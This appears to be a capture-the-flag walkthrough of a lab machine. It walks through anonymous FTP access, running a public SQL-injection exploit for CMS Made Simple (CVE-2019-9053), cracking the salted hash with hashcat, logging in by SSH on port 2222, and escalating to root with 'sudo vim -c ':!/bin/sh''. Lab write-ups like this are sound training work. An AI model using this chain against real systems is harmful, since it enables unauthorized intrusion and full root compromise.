#### Investigation

##### FTP Server
Investigating the FTP server we see Anonymous FTP login allowed
Logging in with:
```plaintext
ftp 10.10.48.157
```
Results:
Connected to 10.10.48.157.

Name (10.10.48.157:root):

Providing the username: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

Enumerating the files/directories on the server we see the following hierarchal tree:
Location: ftp> 
Directories
| _ pub
   | _ ForMitch.txt
   
1 file identified on FPT server within the directory named "pub"

extracting this file using:
```plaintext
mget *
```

Exiting the FTP server with `bye`

Viewing the contents of the extracted file provides:
*Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!*

This identifies potential weak passwords on the host

above shows that the directory /simple is a CMS - content management system 
![[Pasted image 20250216194440.png]]
-  CMS Made Simple version 2.2.8

Researching this version of the Content management system has revealed:
32 results for potential exploitation within exploit DB
Identified the following exploit that is most suitable per CMS version:
Released: 2019-04-02	
Title: CMS Made Simple < 2.2.10 - SQL Injection	
Type: WebApps	
Platform: PHP	
Author: Daniele Scanu
CVE ID: CVE-2019-9053

proceeded to download this executable - titled "46635.py"

added the provided wordlist to the python script located under - 
`/usr/share/seclists/Passwords/Common-Credentials/best110.txt`

Identified the script required python 2

further to execute this exploit using the following command:
```plaintext
python 46635.py -u http://10.10.48.157/simple
```

this script will then attempt to identify the following
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

As we can see by the above results the password for the account is hashed and salted
this will require cracking using the following command:
hash type identified: |20|md5(\$salt.$pass)|

```bash
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --force
```

Cracking the password (also providing the bypass flag) presented the following results:

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret

Password Identified: "secret"

## (----------EXPLOITATION----------)

upon gathering the users credentials 
that was also confirmed to be utilised throughout the system we have gathered the following:

Username: mitch
Email: admin@admin.com
Password: secret

now we can SSH into the server utilising the following command:
(note that ssh is not running on a standard port that being 22 we now know it is running on port 2222)

```bash
ssh -p 2222 mitch@10.10.48.157 
```

asking for the password we provide: "secret


## (-------Privilege Escalation------)

best practice when attempting to elevate privileges is to identify what 
commands can be executed with sudo

```bash
sudo -l
```

results:
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

vim has been identified as an application that can be executed with sudo

researching GTFObins which is:
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

The project collects legitimate functions of Unix binaries that can be abused to get the fuck break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

Searching for "VIM" under the sudo "tab" we have identified the following command that can be used to break out of the restricted shell we are currently in

```bash
sudo vim -c ':!/bin/sh'
```

this will glitch out the vim editor and elevate privileges to root
